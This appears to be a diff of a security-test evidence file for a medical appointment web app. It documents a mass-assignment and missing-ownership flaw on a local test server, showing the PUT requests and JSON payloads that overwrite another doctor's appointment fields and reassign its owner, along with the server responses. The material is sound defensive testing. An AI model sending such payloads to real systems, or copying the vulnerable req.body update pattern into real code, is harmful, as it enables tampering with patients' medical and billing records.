@@ -2,9 +2,9 @@ V-14 Any doctor can rewrite any field of any appointment
 ========================================================
 
 state    : BEFORE the fix
-captured : 2026-09-24T17:41:47.965Z
+captured : 2026-09-27T05:50:10.539Z
 branch   : test/it22083500/v11-v15-before-evidence
-commit   : ec2853c
+commit   : 70455f6
 tool     : Node.js v22.20.0 fetch() — requests sent by security-tests/capture-v11-v15.mjs
            (the same attacks with the real curl binary: before-curl.txt in this folder)
 target   : http://localhost:4000  (disposable in-memory database, localhost only)
@@ -13,22 +13,34 @@ target   : http://localhost:4000  (disposable in-memory database, localhost only
 WHAT THIS PROVES
   updateAppointmentStatus() passes the whole request body to findByIdAndUpdate().
   Nothing limits it to the status field, and nothing checks that the appointment
-  belongs to the doctor making the request.
+  belongs to the doctor making the request — so a doctor can even reassign it.
 
 METHOD: black box — a doctor edits another doctor's appointment, adding extra fields
-
-  caller      : alpha (Doctor, id 6ab560a539b92768520592c2)
-  appointment : 6ab560a539b92768520594bf  — patient Alice, booked with Dr Beta (id 6ab560a539b92768520592c5)
+  caller      : alpha (Doctor, id 6ab8addfc21d788e2815aa0b)
+  appointment : 6ab8addfc21d788e2815ac08  — patient Alice, booked with Dr Beta (id 6ab8addfc21d788e2815aa0e)
   seeded values: patientFirstName "Alice", appointmentCharges "3000", city "Kandy",
-                 department "Oncology", status "Pending"
+                 department "Oncology", status "Pending", doctor = Dr Beta
 
-> fetch PUT $BASE/api/v1/appointment/update/6ab560a539b92768520594bf [with alpha's session cookie]
+ATTACK 1 — send fields other than status (mass assignment)
+> fetch PUT $BASE/api/v1/appointment/update/6ab8addfc21d788e2815ac08 [with alpha's session cookie]
   body: {"status":"Accepted","appointmentCharges":"1","city":"HACKED","department":"HACKED-DEPT","patientFirstName":"Overwritten"}
   HTTP 200
-  {"statusCode":200,"data":{"_id":"6ab560a539b92768520594bf","patient":"6ab560a439b92768520592b8","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab560a539b92768520592c5","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-24T17:40:53.644Z","updatedAt":"2026-09-24T17:41:47.952Z","__v":0},"message":"Appointment Status Updated!"}
+  {"statusCode":200,"data":{"_id":"6ab8addfc21d788e2815ac08","patient":"6ab8addec21d788e2815aa01","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab8addfc21d788e2815aa0e","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-27T05:47:11.485Z","updatedAt":"2026-09-27T05:50:10.521Z","__v":0},"message":"Appointment Status Updated!"}
+  RESULT: ⚠️  5 of 5 submitted fields written: status, appointmentCharges, city, department, patientFirstName
+          on an appointment whose doctor is 6ab8addfc21d788e2815aa0e, by Dr Alpha (6ab8addfc21d788e2815aa0b).
 
-  RESULT: 5 of 5 submitted fields written: status, appointmentCharges, city, department, patientFirstName
-          on an appointment whose doctor is 6ab560a539b92768520592c5 (Dr Beta), by Dr Alpha.
+ATTACK 2 — reassign the owner: set doctor = Dr Alpha, stealing Dr Beta's appointment
+> fetch PUT $BASE/api/v1/appointment/update/6ab8addfc21d788e2815ac08 [with alpha's session cookie]
+  body: {"doctor":"6ab8addfc21d788e2815aa0b"}
+  HTTP 200
+  {"statusCode":200,"data":{"_id":"6ab8addfc21d788e2815ac08","patient":"6ab8addec21d788e2815aa01","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab8addfc21d788e2815aa0b","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-27T05:47:11.485Z","updatedAt":"2026-09-27T05:50:10.533Z","__v":0},"message":"Appointment Status Updated!"}
+  RESULT: ⚠️  appointment owner is now Dr Alpha (6ab8addfc21d788e2815aa0b) — it was Dr Beta (6ab8addfc21d788e2815aa0e)
+
+CONTROL — a patient (Dana) tries to update the appointment (role guard that exists)
+> fetch PUT $BASE/api/v1/appointment/update/6ab8addfc21d788e2815ac08 [with dana's session cookie]
+  HTTP 401
+  {"success":false,"message":"Unauthorized - No token provided"}
+  RESULT: ✅ patient blocked (HTTP 401) — the role check works; the MISSING checks are field-scoping and ownership
 
 WHITE BOX
   backend/src/controllers/appointment.controller.js:61:  appointment = await Appointment.findByIdAndUpdate(id, req.body, {
